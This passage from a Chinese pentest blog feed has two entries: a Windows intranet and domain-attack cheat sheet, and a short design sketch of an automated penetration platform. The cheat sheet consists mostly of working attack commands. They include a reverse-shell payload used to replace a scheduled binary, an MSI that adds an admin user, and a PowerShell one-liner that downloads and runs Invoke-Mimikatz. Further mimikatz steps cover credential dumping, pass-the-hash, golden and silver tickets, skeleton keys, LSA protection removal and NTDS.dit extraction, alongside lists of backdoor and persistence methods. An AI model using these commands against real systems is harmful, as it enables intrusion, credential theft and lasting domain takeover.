#Task To Run:        E:\GrabLogs\tftp.exe 10.1.1.99 GET log.out  E:\GrabLogs\Logs\log.txt
accesschk.exe -dqv "E:\GrabLogs"
msfpayload windows/shell_reverse_tcp lhost='127.0.0.1' lport='9988' O
msfpayload windows/shell_reverse_tcp lhost='127.0.0.1' lport='9988' R | msfencode -t
exe &gt; /root/Desktop/evil-tftp.exe
copy evil-tftp.exe E:\GrabLogs\tftp.exe

#命令行下第一次运行需要同意一个许可，如果不想出现那个提示窗口，则可以执行：
accesschk.exe /accepteula

#找弱权限目录
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\

##找弱权限文件
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*


SC创建服务执行
1、系统权限(其中test为服务名)
sc \\DC1 create test binpath= c:\cmd.exe
sc \\DC1 start test
sc \\DC1 delete test

2.指定用户权限启动
sc \\DC1 create test binpath = "c:\1.exe" obj= "centoso\administrator" passwrod= test
sc \\DC1 start test

</code></pre>
</div>

<p>AlwaysInstallElevated：</p>

<blockquote>
  <p>AlwaysInstallElevated是微软允许非授权用户以SYSTEM权限运行安装文件(MSI)的一种设置。然而，给予用于这种权利会存在一定的安全隐患，因为如果这样做下面两个注册表的值会被置为”1”。</p>
</blockquote>

<p>查询命令如下：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
</code></pre>
</div>
<p>Note：如果这条命令出错类似于：”The system was unable to find the specified registry key or value”，这可能是组策略里AlwaysInstallElevated没有被定义，因此不存在相关联的注册表项。</p>

<p>现在我们假设AlwaysInstallElevated已经启用了，我们可以利用MSFVenom工具来生成一个在目标机器上增加管理员用户的MSI安装文件：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o rotten.msi
</code></pre>
</div>
<p>当我们在目标机器上加载了新生成的MSI文件后，我们可以使用Windows命令行工具Msiexec进行安装：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\rotten.msi
</code></pre>
</div>
<p>Note:使用MSFVenom创建MSI文件时使用了always_install_elevated模块，那么在安装过程中会失败。这是因为操作系统会阻止未注册的安装。</p>

<p>下面的模块效果相同：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>exploit/windows/local/always_install_elevated
</code></pre>
</div>

<p>使用Veil生成免杀payload：</p>

<blockquote>
  <p>这个按照提示走就行了，具体的查查资料。</p>
</blockquote>

<p>msf在meterpreter下的bypassuac尝试：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>use exploit/windows/local/bypassuac_eventvwr
#seach bypassuac
</code></pre>
</div>

<p>Meterpreter的post模块使用：</p>

<blockquote>
  <p>全都是后渗透模块，search post可得部分，在获取一定权限的session后，直接run即可。</p>
</blockquote>

<p>迁移进程获得权限：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>PS 查看域管理所在的进程
Migrate pid注入进程
</code></pre>
</div>

<p>从IPC$到域控【尼玛这得多好的运气】：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>继续经典的IPC$到域控

Meterpreter下面shell

Net use \\域控ip\c$

Net time \\域控ip

Copy bat.bat \\域控ip\c$

At \\域控ip time c:\bat.bat

通往成功的路不只有一条，添加域管账户

Net user demo demo /ad /domain

Net group “domain admins” demo /ad /domain

到了此刻，我们已经拥有域管权限了
</code></pre>
</div>

<h3 id="开启代理">开启代理</h3>

<p>获取10.10.1.1/24网段访问权限。
ssh动态转发 (本地开启socks代理)</p>

<div class="highlighter-rouge"><pre class="highlight"><code>ssh -qTfNCD 0.0.0.0:8081 root@10.10.1.110 (在10.10.2.120上执行)
</code></pre>
</div>

<p>外网机器IP可访问内网机3306：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>ssh -L 3306:外网机器ip:3306   user@隔离机器IP    -N
</code></pre>
</div>

<p>ssh静态转发 (通过本机10.10.3.130的20000端口可以获得10.10.1.1/24网段访问权限)</p>

<div class="highlighter-rouge"><pre class="highlight"><code>ssh -qTfNCL 0.0.0.0:20000:10.10.2.120:8081 root@10.10.3.130
</code></pre>
</div>
<p>(通过10.10.3.130,将10.10.2.120的8081端口转发到本地20000端口)</p>

<p>metasploit:</p>

<div class="highlighter-rouge"><pre class="highlight"><code>portfwd add -l 4445 -p 445 -r 10.10.10.111 (把内网另外一台主机的445端口转到在msf的4445端口)

msf开启socks4代理, 并添加内网路由, msf内部模块可直接通过session路由访问内网, 外部程序可通过socks4代理访问内网。

use auxiliary/server/socks4a | run (msf开启socks4代理, 默认是1080端口)
msf exploit(handler) &gt; sessions
Active sessions
===============
  Id  Type                     Information                                      Connection
  --  ----                     -----------                                      ----------
  1   meterpreter x86/windows  MICROSOF-CA98DC\Administrator @ MICROSOF-CA98DC  192.168.71.196:58308 -&gt; 192.168.71.167:443 (192.168.71.167)
msf exploit(handler) &gt; route add 192.168.71.196/24 1
[*] Route added
msf exploit(handler) &gt; route
IPv4 Active Routing Table
=========================
  Subnet             Netmask            Gateway
  ------             -------            -------
  192.168.71.196     255.255.255.0      Session 1
[*] There are currently no IPv6 routes defined。
msf exploit(handler) &gt;
</code></pre>
</div>

<h3 id="横向执行命令">横向执行命令</h3>

<div class="highlighter-rouge"><pre class="highlight"><code>net use x: \\[目标IP]\[地址] [域用户password] /user:[域]\[username]

(python版的psexec) psexec.py administrator:123456@192.168.71.165 -port 445

at \\192.168.200.100 15:00 c:\hack.bat

psexec \\192.168.1.2 c:\hack.bat【执行单条命令】
psexec \192.168.200.100 cmd【半交互shell】
</code></pre>
</div>

<p>上面是提供账号密码的情况，如果有时候我们抓取到的是hash，破解不了时可以利用WCE的hash注入【传递】，然后再执行WMIEXEC（不提供账号密码）就可以了。</p>

<div class="highlighter-rouge"><pre class="highlight"><code>cscript.exe //nologo wmiexec.vbs /shell 192.168.1.1 username password【半交互shell】
cscript.exe  wmiexec.vbs /cmd 192.168.1.1 username password  "command"【执行单条命令】
</code></pre>
</div>
<p>wce注入hash后进行命令执行</p>

<div class="highlighter-rouge"><pre class="highlight"><code>wce -s [hash] 
cscript.exe //nologo wmiexec.vbs /shell 192.168.1.1
</code></pre>
</div>

<p>运行时间长的命令时，如ping,systeminfo之类的，记得加上-wait5000或者更久的时间选项。
运行nc反弹或者木马等不需要输出结果、同时需要一直运行的程序时，一定要加上-persist选项，不然你就只能去taskkill远程结束进程了。</p>

<p>使用NTLM hash远程连接：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>以管理员权限运行：
mimikatz "privilege::debug" "sekurlsa::pth /user:a /domain:test.local /ntlm:efa85b42d77dc2fdbdbdb767792b0a11"
dir \\192.168.40.132\c$
</code></pre>
</div>

<p>注:
虽然”sekurlsa::pth”在mimikatz中被称之为”Pass The Hash”,但是其已经超越了以前的”Pass The Hash”，部分人将其命名为”Overpass-the-hash”，也就是”Pass-the-key”</p>

<p>使用aes key远程连接（kb2871997 Installed）：
获取aes key 的mimikatz命令为：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>privilege::debug
sekurlsa::ekeys
</code></pre>
</div>

<p>无法复制时，开启日志记录功能后会把输出回显的内容保存在同级目录下的mimikatz.log中：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>mimikatz log privilege::debug sekurlsa::ekeys
</code></pre>
</div>

<p>以管理员权限运行：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>privilege::debug
sekurlsa::pth /user:a /domain:test.local /aes256:f74b379b5b422819db694aaf78f49177ed21c98ddad6b0e246a7e17df6d19d5c" 
privilege::debug
sekurlsa::pth /user:a /domain:test.local /aes128:8cce86e4b0630f07fcf5f2110068c421" 

dir \\WIN-8VVLRPIAJB0\c$
</code></pre>
</div>

<p>注意：</p>

<p>这里dir要使用主机名 而不是ip，不然会提示用户名或密码错误。</p>

<h3 id="保持权限">保持权限</h3>

<p>这块儿东西太多，只能简单提下，有机会单独撰文分析。</p>

<h5 id="linux后门">Linux后门</h5>
<p>webshell，rootkit，改普通用户权限，在某些服务和软件上做手脚，添加ssh-key，添加键盘钩子。</p>

<h5 id="win后门">Win后门</h5>
<p>webshell，劫持dll，劫持在login界面能触发的软件，添加隐藏用户，克隆用户，加远控，powershel脚本，各种票据，开盘符共享，在某些服务和软件上做手脚，添加键盘钩子。</p>

<h5 id="维持域控权限">维持域控权限</h5>

<p>1.直接获取lsass.exe（SSP）中的明文密码：
修改域控注册表位置，在Security Packages下添加mimilib.dll：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\Security Packages\
</code></pre>
</div>
<p>域控重启后在c:\windows\system32可看到新生成的文件kiwissp.log，里面记录了密码。
mimikatz同时还支持通过内存更新ssp，这样就不需要重启再获取账户信息：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>privilege::debug
misc::memssp
</code></pre>
</div>

<p>2.Hook PasswordChangeNotify无痕，不需要重启和修改注册表，生成dll注入的powershell脚本：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>https://github.com/clymb3r/Misc-Windows-Hacking/blob/master/HookPasswordChange/Debug/HookPasswordReset.dll

https://github.com/clymb3r/PowerShell/blob/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1
在代码尾部添加如下代码：
Invoke-ReflectivePEInjection -PEPath HookPasswordChange.dll –procname lsass
并命名为HookPasswordChangeNotify.ps1

上传HookPasswordChangeNotify.ps1和HookPasswordChange.dll，管理员权限执行：
PowerShell.exe -ExecutionPolicy Bypass -File HookPasswordChangeNotify.ps1
</code></pre>
</div>
<p>域控更新密码后（手动），在C:\Windows\Temp下可以找到passwords.txt，其中记录了新修改的密码。</p>

<p>3.Skeleton Key（不需要域控重启）
正常登录域控：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>net use \\WIN-8VVLRPIAJB0.test.local 12345678!Q /user:a@test.local
dir \\WIN-8VVLRPIAJB0.test.local\c$
</code></pre>
</div>
<p>mimikatz在域控上安装Skeleton Key：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>privilege::debug
misc::skeleton
</code></pre>
</div>
<p>使用Skeleton Key登录，mimikatz的默认Skeleton Key设置为mimikatz，权限不变，只是万能密码：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>net use */del /y
net use \\WIN-8VVLRPIAJB0.test.local mimikatz /user:a@test.local
dir \\WIN-8VVLRPIAJB0.test.local\c$
</code></pre>
</div>
<p>4.绕过LSA保护策略，似乎需要自带的mimidrv.sys文件：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>privilege::debug
!+
!processprotect /process:lsass.exe /remove
misc::skeleton
</code></pre>
</div>
<p>本地组策略禁用一些重要组件后，使用mimikatz绕过：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>privilege::debug
misc::cmd
misc::regedit
misc::taskmgr
</code></pre>
</div>

<h3 id="扫描内网">扫描内网</h3>

<h5 id="漏洞扫描">漏洞扫描</h5>

<p>漏洞扫描跟外网不同的是，流量需要控制，但是多数情况下是不会有WAF和防火墙的。</p>

<p>当然，在大一点的内网，如果没有流量监控和分析一般是可能性比较小的。</p>

<p>使用脚本漏洞扫描【如awvs】和路径爆破【如御剑】，操作大体与外网扫描相似。</p>

<p>其实国人也写过不少优秀的自研扫描器，里面有部分是内网专用的：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>https://github.com/We5ter/Scanners-Box
</code></pre>
</div>

<h5 id="信息探测">信息探测</h5>

<p>这类漏扫一般都会提供，可能会探测特定的服务、探测Title等等，但一些专有用途的刺探脚本也许会优于综合型漏扫。</p>

<h5 id="服务探测">服务探测</h5>

<p>服务探测主要使用nmap、masscan一类的端口扫描器，他们存有banner可以和数据库里存储的服务版本进行对比，从而给我们输出相关信息。</p>

<h5 id="口令爆破">口令爆破</h5>

<p>一般像hscan【windows】或者hydra【跨平台】的会比较合适，如果能做sock或者http/https代理的话，如Nmap/MSF里script的效果也是不错的。
至于国内传统厂商出的一些扫描器则显得比较笨拙，做自检还勉强，部署也相当麻烦。</p>

<h3 id="攻击域控">攻击域控</h3>

<h5 id="导出域内用户hash">导出域内用户hash</h5>

<blockquote>
  <p>1.gethashes.exe $local</p>
</blockquote>

<blockquote>
  <p>2.mimikatz</p>
</blockquote>

<div class="highlighter-rouge"><pre class="highlight"><code>privilege::debug
sekurlsa::logonpasswords
获得域控权限、导出所有用户口令、维持域控权限：

附上一套完整打法：
http://blog.csdn.net/pyphrb/article/details/52051321
攻击域控，获得权限

使用ms14-068漏洞
ms14-068.exe -u -p -s -d 【这里参数值省略】

生成伪造缓存test.ccache: 
导入伪造缓存: mimikatz：
kerberos::ptc test.ccache

登陆：
net use \\A-635ECAEE64804.TEST.LOCAL
dir \\A-635ECAEE64804.TEST.LOCAL\c$

导出域
（1）直接获取内存口令 mimikatz：
privilege::debug
sekurlsa::logonpasswords
（2）通过内存文件获取口令 使用procdump导出lsass.dmp mimikatz：

sekurlsa::minidump lsass.dmp
sekurlsa::logonPasswords full
（3）通过powershell加载mimikatz获取口令

powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz
（4）导出所有用户口令 使用Volue Shadow Copy获得SYSTEM、SAM备份（之前文章有介绍） mimikatz：

lsadump::sam SYSTEM.hiv SAM.hiv持域控权限

（1）Skeleton Key mimikatz：

privilege::debug
misc::skeleton
万能钥匙，可使用任意用户登陆域控

net use \\A-635ECAEE64804.TEST.LOCAL mimikatz /user：test

4、维持域控权限
（1）Skeleton Key mimikatz：

privilege::debug
misc::skeleton
万能钥匙，可使用任意用户登陆域控

net use \\A-635ECAEE64804.TEST.LOCAL mimikatz /user：test
这里写图片描述 
（2）golden ticket mimikatz：

lsadump::lsa /patch 
获取krbtgt的ntlmhash

生成万能票据： mimikatz：

kerberos::golden /user:Administrator /domain:test.local /sid:S-1-5-21-2848411111-3820811111-1717111111 /krbtgt:d3b949b1f4ef947820f0950111111111 /ticket:test.kirbi
导入票据： mimikatz：

kerberos::ptt test.kirbi
登陆域控：

net use \\A-635ECAEE64804.TEST.LOCAL
dir \\A-635ECAEE64804.TEST.LOCAL\c$

（3）Pass-The-Hash mimikatz：

sekurlsa::pth /user:Administrator /domain:test.local /ntlm:cc36cf7a8514893efccd332446158b1a

</code></pre>
</div>

<blockquote>
  <p>3.pwdump【直接运行Pwdump7即可】</p>
</blockquote>

<blockquote>
  <p>4.vssown.vbs + libesedb + NtdsXtract【太耗时】
http://pauldotcom.com/2011/11/safely-dumping-hashes-from-liv.html</p>
</blockquote>

<blockquote>
  <p>5.ShadowCopy+QuarksPwDump【参考内容见下】：
http://blog.csdn.net/citelao/article/details/50948103</p>
</blockquote>

<div class="highlighter-rouge"><pre class="highlight"><code>（1）使用ShadowCopy的命令行版，编写bat实现拷贝ntds.dit至当前目录

setlocal
if NOT "%CALLBACK_SCRIPT%"=="" goto :IS_CALLBACK
set SOURCE_DRIVE_LETTER=%SystemDrive%
set SOURCE_RELATIVE_PATH=\windows\ntds\ntds.dit
set DESTINATION_PATH=%~dp0
@echo ...Determine the scripts to be executed/generated...
set CALLBACK_SCRIPT=%~dpnx0
set TEMP_GENERATED_SCRIPT=GeneratedVarsTempScript.cmd
@echo ...Creating the shadow copy...
"%~dp0vsshadow.exe" -script=%TEMP_GENERATED_SCRIPT% -exec="%CALLBACK_SCRIPT%" %SOURCE_DRIVE_LETTER%
del /f %TEMP_GENERATED_SCRIPT%
@goto :EOF
:IS_CALLBACK
setlocal
@echo ...Obtaining the shadow copy device name...
call %TEMP_GENERATED_SCRIPT%
@echo ...Copying from the shadow copy to the destination path...
copy "%SHADOW_DEVICE_1%\%SOURCE_RELATIVE_PATH%" %DESTINATION_PATH%
参考链接： http://blogs.msdn.com/b/adioltean/archive/2005/01/05/346793.aspx

（2）使用QuarksPwDump直接读取信息并将结果导出至文件，先执行

esentutl /p /o ntds.dit
修复复制出来的数据库

QuarksPwDump.exe -dhb -hist -nt ntds.dit -o log.txt
读取并导出。

注：实际使用时ntds.dit和log.txt需要加绝对路径

Tips：

QuarksPwDump.exe：Dump various types of Windows credentials without injecting in any process.
源码下载链接，vs2010直接编译即可
https://github.com/quarkslab/quarkspwdump
</code></pre>
</div>

<blockquote>
  <p>6.ntdsutil.exe + QuarksPwDump.exe【生成ntds.dit，再读取hash】</p>
</blockquote>

<div class="highlighter-rouge"><pre class="highlight"><code>#ntdsutil
#snapshot
#activate instance ntds
#create
#mount {GUID}
#copy c:\MOUNT_POINT\WINDOWS\NTDS\NTDS.dit c:\NTDS_saved.dit
#unmount {GUID}
#delete {GUID}
#quit
#quit

#QuarksPwDump.exe --dump-hash-domain --ntds-file c:\ntds.dit
</code></pre>
</div>

<blockquote>
  <p>7.powershell【比如上文提到的Invoke-mimikatz脚本】</p>
</blockquote>

<h5 id="hash传递">hash传递</h5>

<p>受限管理员模式顾名思义,只对管理员组有效.所以如果你获取到的用户属于远程桌面用户组,那么是无法通过hash登录的.会提示错误。</p>

<p>mimikatz:</p>
<div class="highlighter-rouge"><pre class="highlight"><code>sekurlsa::pth /user:Administrator /domain:test.local /ntlm:cc36cf7a8514893efccd332446158b1a
</code></pre>
</div>

<p>MSF:</p>
<div class="highlighter-rouge"><pre class="highlight"><code>use exploit/windows/smb/psexec

</code></pre>
</div>

<p>Keimpx：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>Keimpx -t ip -c ~/hash.txt -v 2
</code></pre>
</div>

<p>PTH套件：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>Pth-winexe可以借助哈希执行程序得到一个cmdshell
Pth-winexe - U ... //ip cmd

参考：
http://blog.csdn.net/the__apollo/article/details/70474935

</code></pre>
</div>

<p>WCE：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>wce -s ...
</code></pre>
</div>

<p>psexec/wmiexec：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>前面有提到用法，这里就不单独讲了。
</code></pre>
</div>

<p>附上横向域渗透【案例比较经典】</p>

<div class="highlighter-rouge"><pre class="highlight"><code>http://www.mottoin.com/89413.html
</code></pre>
</div>

<h3 id="提取票据">提取票据</h3>

<h5 id="传递票据">传递票据</h5>

<p>因为域用户对应sid本就可以通过程序自动获取，清除导入票据也能自动实现，当然，如果想用其他域用户信息攻击，也可以加上sid手动导入票据，kekeo的快捷用法仅需要以下参数：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>https://github.com/gentilkiwi/kekeo/releases

ms14068.exe /domain:test.local /user:test /password:test /ptt
</code></pre>
</div>

<p>在我们成功获得域控权限后，就可以导出域控内存中的Ticket，在默认的10个小时以内都可以利用来登录域控</p>

<p>通过mimikatz导出内存中的Ticket，执行：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>sekurlsa::tickets /export
</code></pre>
</div>
<p>保存成文件，一共导出如下文件，找个像这样的：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>xxx@krbtgt-TEST.LOCAL.kirbi
</code></pre>
</div>

<p>在域普通用户的主机进行导入：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>mimikatz "kerberos::ptt C:\test\xxx@krbtgt-TEST.LOCAL.kirbi"
</code></pre>
</div>

<p>查看是否有域控权限，</p>
<div class="highlighter-rouge"><pre class="highlight"><code>klist
dir \\xxxx\c$
</code></pre>
</div>
<h5 id="金票据">金票据</h5>

<p>每个用户的Ticket都是由krbtgt的密码Hash来生成的，那么，我们如果拿到了krbtgt的密码Hash，不就可以随意伪造Ticket了吗？</p>

<p>实际上只要拿到了域控权限，在上面就可以很容易的获得krbtgt的Hash值，再通过mimikatz即可生成任意用户任何权限的Ticket，也就是Golden Ticket。</p>

<p>域控执行下面的命令，生成mimikatz.log记录输出，使用log输出是为了方便复制Hash值：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>mimikatz log "lsadump::dcsync /domain:test.local /user:krbtgt"
</code></pre>
</div>
<p>找到如下的信息：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>/domain：test.local
/sid:S-1-5-21-4155807533-921486164-2767329826 
/aes256:af71a24ea463446f9b4c645e1bfe1e0f1c70c7d785df10acf008106a055e682f
</code></pre>
</div>
<p>生成Golden Ticket,伪造的用户设置为god,执行下面的命令，生成文件gold.kirbi:</p>

<div class="highlighter-rouge"><pre class="highlight"><code>mimikatz "kerberos::golden /domain:test.local /sid:S-1-5-21-4155807533-921486164-2767329826 
/aes256:af71a24ea463446f9b4c645e1bfe1e0f1c70c7d785df10acf008106a055e682f /user:god 
/ticket:gold.kirbi"
</code></pre>
</div>

<p>注意，生成Golden Ticket不仅可以使用aes256，也可用krbtgt的NTLM hash，可以用mimikatz “lsadump::lsa /patch”导出。</p>

<p>导入Golden Ticket：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>mimikatz# kerberos::ptt c:\test\gold.kirbi
</code></pre>
</div>
<p>检验是否成功获得域控权限：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>c:&gt;klist
c:&gt;dir \\xxxx\c$
</code></pre>
</div>
<p>注意：
这种方式导入的Ticket默认在20分钟以内生效，当然，如果过期了，再次ptt导入Golden Ticket就好。可以伪造任意用户，即使其不存在。可以伪造任意用户，即使其不存在。</p>

<p>另一种做法，大同小异，注意这里填写的是域管理：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>mimikatz # kerberos::purge
mimikatz # kerberos::golden /admin:Administrator /domain:pentstlab.com /sid:S-1-5-21-3883552807-251258116-2724407435 /krbtgt:6a8e501fabcf264c70ef3316c6aab7dc /ticket:Administrator.kiribi
mimikatz # kerberos::ptt Administrator.kiribi
mimikatz # kerberos::tgt

#验证下：
E:\&gt;net use \\WIN-0DKN2AS0T2G\c$
E:\&gt;psexec.exe \\WIN-0DKN2AS0T2G cmd
</code></pre>
</div>

<h5 id="银票据">银票据</h5>
<p>Silver Ticket是伪造的TGS(Ticket Granting Server)ticket，所以也叫service ticket。
将它同Golden Ticket做对比：</p>
<blockquote>
  <p>1、访问权限不同
Golden Ticket是伪造的TGT(Ticket Granting Ticket)，所以可以获取任何Kerberos服务权限。
Silver Ticket是伪造的TGS，也就是说其范围有限，只能访问指定的服务权限。</p>
</blockquote>

<blockquote>
  <p>2、加密方式不同
Golden Ticket是由krbtgt的hash加密
Silver Ticket是由服务账户（通常为计算机账户）hash加密</p>
</blockquote>

<blockquote>
  <p>3、认证流程不同
Golden Ticket在使用的过程需要同域控通信
Silver Ticket在使用的过程不需要同域控通信
也就是说只要手里有Silver Ticket，就可以跳过KDC认证，直接去访问指定的服务。</p>
</blockquote>

<p>在域控上执行如下命令来获取域控主机的本地管理员账户hash：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>mimikatz log "sekurlsa::logonpasswords"
</code></pre>
</div>

<p>整理信息，使用mimikatz执行如下命令导入Silver Ticket，此时可以成功访问域控上的文件共享：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>mimikatz "kerberos::golden /domain:test.local /sid:S-1-5-21-4155807533-921486164-2767329826 /target:WIN-8VVLRPIAJB0.test.local /service:cifs /rc4:d5304f9ea69523479560ca4ebb5a2155 /user:silver /ptt"
</code></pre>
</div>
<p>注意：
Silver Ticket是伪造的TGS，也就是说其范围有限，只能访问指定的服务权限。
代替方案，如下可以远程访问LDAP服务来获得krbtgt的信息：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>mimikatz "lsadump::dcsync /dc:WIN-8VVLRPIAJB0.test.local /domain:test.local /user:krbtgt"
</code></pre>
</div>

<p>注意：</p>
<blockquote>
  <p>lsadump::dcsync
向 DC 发起一个同步对象（可获取帐户的密码信息）的质询。
需要的权限包括管理员组（Administrators），域管理员组（ Domain Admins）或企业管理员组（Enterprise Admins）以及域控制器的计算机帐户
只读域控制器默认不允许读取用户密码数据。</p>
</blockquote>

<h3 id="中间人攻击">中间人攻击</h3>

<p>中间人攻击有很多方法，有借助arp进行双向欺骗嗅探，有借助内网DNS劫持的，有借助断网重连直接劫持的。</p>

<p>经典的工具有netfuke，cain，ettercap等等。</p>

<p>具体的在此不多说，以后有机会继续补充。</p>

<h3 id="跨网段攻击">跨网段攻击</h3>

<h5 id="借助多网卡主机">借助多网卡主机</h5>

<p>如果在多网卡主机的情况下，我们可以通过msf建立路由，然后转发，最终通过sock建立代理。</p>

<h5 id="借助交换机路由">借助交换机/路由</h5>

<p>一般大一点的路由，或者三、四层交换机可能会提供VPN功能，通过命令行或者WEB界面能操作进行启用或转发。
当然部分命令行被封装在沙盒里，功能是比较有限的。</p>

<h5 id="借助代理">借助代理</h5>

<p>内网和外网入口本身可能存在认证vpn【默认密码、弱口令】，甚至匿名代理。而通过他们我们也可以跨网段进行渗透。</p>

<h3 id="后记">后记</h3>

<p>本文大部分资料参考自网络，因为内容太多无法一一附上出处，有介意的原作者请私信我加上。
最后，感谢某云、FB、数字等等，感谢互联网上所有热爱分享的童鞋们。</p>
]]></content>
      <categories>
        
          <category> pentest </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[规模渗透架构部署设想]]></title>
      <url>/pentest/2017/12/16/architecture-of-apt-pentest/</url>
      <content type="html"><![CDATA[<p>
	<span style="color:#00B050;"><strong>在我们的测试中，可能在对大型目标进行探测时，人手不足就会显得特别无力。这时候，使用机器代替人工进行一些重复性工作，就显得尤为重要。咱们在这儿来谈谈，如何开发和部署APT渗透系统的架构。</strong></span>
</p>

<h3 id="web扫描系统">web扫描系统</h3>

<p>在web扫描框架上，我们可以这样设计：</p>

<ul>
  <li>信息探测模块：通过指定URL，自动获取该网站的基本信息。</li>
  <li>资产发现模块：收集子域名，并对主机IP资产进行梳理。</li>
  <li>基础扫描模块：对网站进行路径探测，对系统进行端口探测。</li>
  <li>弱口令核查模块：对主机系统和常用CMS网站进行默认/弱口令检测。</li>
  <li>漏洞扫描模块：以体系内域名URL为入口点，可以只单独探测该URL的web漏洞；也可以根据该入口点，进行自动化资产发现和检测，再统一对获得的资产进行扫描。</li>
  <li>社工搜集模块：从多个搜索引擎和接口中，提取有需要的信息，供给其他模块使用。</li>
  <li>第三方扫描模块：可集成第三方扫描器，通过接口进行模块化整合。</li>
</ul>

<h3 id="口令核查系统">口令核查系统</h3>

<p>在web扫描系统里，本来是集成了弱口令核查模块。但其中仅仅对常用的CMS和系统服务进行了核查，而且力度比较有限。</p>

<p>此处对口令核查系统的设计，旨在对特定的系统服务或者后台进行爆破，功能大概如下：</p>

<ul>
  <li>定制化社工字典，拥有生成选项。</li>
  <li>可以破解简单验证码。</li>
  <li>可附加验证码绕过、明文提取选项。</li>
  <li>集成扫描框架的爆破脚本。</li>
  <li>集成Hydra和Medusa以及某些工具，供给调用。</li>
</ul>

<h3 id="漏洞分储系统">漏洞分储系统</h3>

<p>在这个系统上，鄙人将它设计为漏洞库，提供api给第三方调用。</p>

<p>其中，需要注意以下几点：</p>
<ul>
  <li>部分提供poc调用，无poc的提供详情。</li>
  <li>前端提供搜索和查看功能。</li>
  <li>提供API调用。</li>
</ul>

<h3 id="漏洞验证系统">漏洞验证系统</h3>

<p>这个功能本来想和漏洞分储系统相结合的，但后来为了耦合性，还是分离了出来。</p>
<ul>
  <li>支持单条和批量验证。</li>
  <li>搜索选取漏洞exp。</li>
  <li>采用中间件来传递消息。</li>
  <li>延时结果记录。</li>
  <li>不做数据记录。</li>
</ul>

<h3 id="域名采集系统">域名采集系统</h3>

<p>最初的版本只做了域名采集的爬虫，但后来考虑到实用性，后期会集成市面上已有的一些域名采集技术。
另外，这里会支持分布式/命令行运行，提供api给第三方调用。管控中心可以一键发送执行。功能如下：</p>
<ul>
  <li>域名爬虫。</li>
  <li>其他域名采集技术。</li>
</ul>

<p>至于细节，可以参加之前撰写的博文<a href="/spider/2017/10/19/domain-spider/">《域名采集爬虫》</a>。</p>

<h3 id="渗透方案查询">渗透方案查询</h3>

<p>这是在某产品经理启发下的产物，在渗透中常常在进行到某一步时，会遇到卡壳的时候。</p>

<p>这时候我们就需要一个可查阅的清单或者wiki，甚至能给出完整的建设性方案。后来大概考虑了下，大概可以这样构建：</p>

<ul>
  <li>知名系统获取shell建议（扫描有限制）</li>
  <li>提权流程列表</li>
  <li>横向和后渗透命令清单</li>
  <li>复杂系统获取权限详情</li>
  <li>powershell脚本功能查询</li>
  <li>武器库列表</li>
</ul>

<h3 id="渗透报告管理">渗透报告管理</h3>

<p>当然，在渗透后可能会有报告输出。也有可能需要上传和填写报告，本系统可能会要求几个点：</p>

<ul>
  <li>拥有固定格式，可以导出pdf、word等格式。</li>
  <li>自动整理可能获取权限的机器和敏感IP段。</li>
  <li>上传报告时，需要填写固定几个要点，比如IP和主机名以及网段，然后再填写细节。</li>
</ul>

<h3 id="核管控中心">核管控中心</h3>

<p>一套完整的APT渗透框架，总是需要核心管控的，这样方便管理，也能方便全局统筹的需求。
大体功能，可能有以下几点：</p>

<ul>
  <li>系统机器上线和下线控制。</li>
  <li>可以API命令调用各系统。</li>
  <li>以IP或者域名为入口，对所有现存系统数据库进行检索。</li>
  <li>配置全局参数，不定期更新，对各系统推送。</li>
</ul>

<h3 id="总结">总结</h3>

<p>直至撰稿之日，鄙人已经完成了一部分工作。但由于研究方向有变，再加上一些其他不可抗拒的原因，可能开发工作会停滞一段时间。</p>

<p>在以后恢复开发工作时，应该会有更多的思路更新，与诸君共勉！</p>
]]></content>
      <categories>
        
          <category> pentest </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
